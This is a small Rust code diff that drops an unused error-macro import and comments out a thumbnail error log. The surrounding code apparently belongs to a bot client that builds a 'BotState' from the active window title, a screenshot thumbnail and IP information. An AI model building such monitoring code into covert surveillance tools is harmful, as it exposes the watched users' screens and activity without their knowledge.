@@ -11,7 +11,6 @@ use winapi::um::winuser::{ GetForegroundWindow, GetWindowTextA, GetWindowTextLen
 use std::io::Cursor;
 use screenshots::Screen;
 use screenshots::image;
-use crate::err;
 use crate::network::basic::get_ip_info;
 
 fn get_active_window() -> String {
@@ -65,7 +64,7 @@ pub async fn generate_bot_state() -> BotState {
         thumbnail: get_thumbnail()
             .map(Some)
             .unwrap_or_else(|error| {
-                err!("Error getting thumbnail", error);
+                // err!("Error getting thumbnail", error);
                 None
             }),
         dynamic_info: get_dynamic_info(),
